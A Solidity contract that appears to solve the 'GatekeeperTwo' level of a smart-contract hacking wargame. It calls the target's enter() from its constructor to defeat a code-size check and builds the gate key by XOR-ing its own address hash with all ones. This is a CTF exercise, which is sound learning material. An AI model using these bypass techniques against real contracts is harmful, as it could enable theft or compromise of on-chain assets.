// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    function enter(bytes8 _gateKey) public returns (bool) {}
}


contract GatekeeperTwoSol {

    address _addr = 0xDdEe904CBb5d5Ea04C194801652741a568b3fD83;
    GatekeeperTwo contr = GatekeeperTwo(_addr);

    uint64 public f;
    bytes8 bytesGateKey;
    uint64 public uintGateKey;
    uint64 public gateVar; 


    constructor (){
        gateVar = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        unchecked { f = uint64(0) - 1; }
        uintGateKey = gateVar ^ f;
        bytesGateKey = bytes8(uintGateKey);
        contr.enter(bytesGateKey);
    }

}